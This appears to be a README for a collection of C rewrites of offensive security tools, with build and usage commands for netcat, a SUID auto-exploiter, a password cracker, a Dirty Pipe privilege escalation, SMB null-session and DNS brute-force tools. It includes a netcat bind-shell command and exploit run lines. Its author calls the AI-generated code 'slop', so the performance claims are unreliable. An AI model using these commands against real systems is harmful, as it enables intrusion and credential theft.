### Security Tooling

1. Netcat

<pre>
nc google.com 80

GET / HTTP/1.0    # then press Enter twice

nc -l 1337                    # listen
nc -l 1337 -e "/bin/sh"        # classic bind shell

# From another machine:
nc your-ip 1337

# Simple port scan
nc 10.1.1.1 1-1000
</pre>

2. Suid Finder

<pre>
# 1. Just scan (safe)
gcc -o suidfinder suid_exploiter.c
./suidfinder

# 2. Auto-exploit mode
sudo ./suidfinder -x
</pre>

3. Strings 2.0 - Malware is not my domain and I could barely tell what the script is doing here. This will take thorough reading and analyzing compared to other scripts. I know what the string utility is used for, just not it's inner workings.

<pre>
gcc -o strings2 strings2.c -lm

./strings2 strings2
./strings2 malware.exe
./strings2 firmware.bin -l 10 -e 6.0
./strings2 dump.dmp -x | less -R
</pre>

4. John The Ripper

<pre>
gcc -O3 -o tinyjohn tinyjohn.c -lcrypto -lpthread
./tinyjohn hashes.txt /usr/share/wordlists/rockyou.txt

Real-world performance (on an i7)

Raw-MD5:      ~22 million passwords/sec
NTLM:         ~22 million/sec
md5crypt:     ~85,000/sec (good enough for weak passwords)
bcrypt cost 12: ~300–400 hashes/sec (slow on purpose — that’s bcrypt)

</pre>

5. Dirty Pipe [CVE-2022-0847] - Local PrivEsc

<pre>
gcc -o dirtypipe dirtypipe.c -Wall
./dirtypipe
</pre>

6. LinEnum - Linux PrivEsc Enum Script

<pre>
gcc -O2 -o linenum linenum.c
./linenum | tee enum.txt

Why this beats bash script version

No /bin/sh dependency → works in restricted shells
No external tools needed → works on minimal containers
30 KB binary → easy to transfer
Color output + clean formatting
Finds 95% of privesc vectors in < 10 seconds

</pre>

7. Smb Null Session

<pre>
gcc -o smbnull smbnull.c
./smbnull 10.10.10.8
./smbnull 192.168.10.0/24

[+] NULL SESSION SUCCESS → 10.10.10.8
    Trying common shares...
      → C$ is readable!
      → ADMIN$ is readable!
      → IPC$ is readable!

Zero dependencies (no Samba, no Python)
Works on Linux/macOS/BSD
Checks null session (blank username/password)
Lists all readable shares instantly
Detects IPC$ (pipe) access → often leads to NTLM hash dumping
</pre>

8. DNS Bruteforcer

<pre>
# Fastest built-in mode
gcc -O3 -o dnsbf dnsbf.c -lpthread
./dnsbf megacorp.local

# With your own wordlist (250k+ lines = fine)
./dnsbf internal.corp biglist.txt -t 128

Subdomain brute-force (A + AAAA + CNAME)
~250k queries/sec on a decent box
Multi-threaded (64 threads by default)
Built-in wordlist (top 10k) + external wordlist support
Wildcard detection & filtering
Zero dependencies
</pre>

9. Masscan

<pre>
gcc -O3 -o masscan masscan.c -lpthread
sudo ./masscan 192.168.1.0/24 80,443,22 -r 500000 -b

Real performance (i9 + 10G NIC)

1.2 million packets/sec
Full /24 in ~2.8 seconds
Banner grab works on HTTP/SSH/etc.
</pre>


> P.S. I used Grok because of unrestricted tokens, no rate limits and premium subscription required. Grok was always so smart. Highly underestimated. This project has been birthed during Thanksgiving weekend. I hope everyone is thankful for such awesome slop.

